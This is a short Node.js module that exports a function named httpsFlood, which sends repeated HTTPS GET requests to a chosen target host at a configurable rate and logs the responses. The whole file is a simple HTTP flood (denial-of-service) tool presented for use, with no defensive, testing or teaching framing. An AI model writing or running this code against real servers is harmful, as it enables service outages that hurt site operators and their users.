const https = require('https');

function httpsFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const req = https.request({
            hostname: target,
            port: 443,
            path: '/',
            method: 'GET'
        }, (res) => {
            res.on('data', (chunk) => {
                logOutput('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            logOutput('Error: ' + err.message);
        });

        req.end();
    }, 1000 / rateLimit);
}

module.exports = httpsFlood;
